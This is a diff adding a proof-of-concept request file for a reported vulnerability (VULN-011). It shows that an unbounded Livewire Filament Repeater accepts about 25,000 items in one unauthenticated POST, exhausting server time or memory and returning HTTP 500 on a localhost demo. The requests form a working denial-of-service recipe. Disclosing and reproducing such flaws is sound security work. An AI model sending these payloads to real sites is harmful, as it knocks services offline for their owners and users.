@@ -1,0 +1,19 @@
+### VULN-011 — decisive request. Full capture in response.txt / run.log.
+### data.repeater is public (non-#[Locked]) Livewire state. A Repeater hydrates one
+### full child schema per item; maxItems() is opt-in and unset by default → no ceiling.
+
+### 1) Snapshot (unauthenticated demo page)
+GET /forms/fields/repeater HTTP/1.1
+Host: localhost:21890
+
+### 2) Submit ~25,000 repeater items in one request → ~30s server work → HTTP 500
+POST /livewire/update HTTP/1.1
+Host: localhost:21890
+Content-Type: application/json
+X-Livewire: true
+
+{"_token":"<csrf>","components":[{"snapshot":"<forms.fields-demo snapshot>","calls":[],
+  "updates":{"data.repeater":[{"name":"n0","role":"developer"}, /* ...×25000... */ ]}}]}
+
+### Response: HTTP 500; app log: "Maximum execution time of 30 seconds exceeded"
+### (or "Allowed memory size ... exhausted" at higher item counts).
